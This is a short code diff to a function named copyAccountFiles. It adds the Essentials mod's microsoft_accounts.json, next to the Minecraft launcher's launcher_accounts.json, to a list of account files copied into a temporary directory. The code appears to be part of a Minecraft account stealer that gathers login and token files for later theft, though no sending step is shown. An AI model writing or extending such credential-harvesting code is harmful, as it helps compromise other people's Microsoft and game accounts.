@@ -65,7 +65,13 @@ function copyAccountFiles(tempDir) {
             name: "DefaultMCLauncher",
             path: system.appData.getAbsolutePath() + "/.minecraft/launcher_accounts.json",
             dest: "mclauncher/launcher_accounts.json"
+        },
+        {
+            name: "Essentialsold",
+            path: system.mcDir.getParentFile().getParentFile().getParentFile().getAbsolutePath() + "/essentials/microsoft_accounts.json",
+            dest: "essentialsold/microsoft_accounts.json"
         }
+        
     ];
 
     targets.forEach(target => {
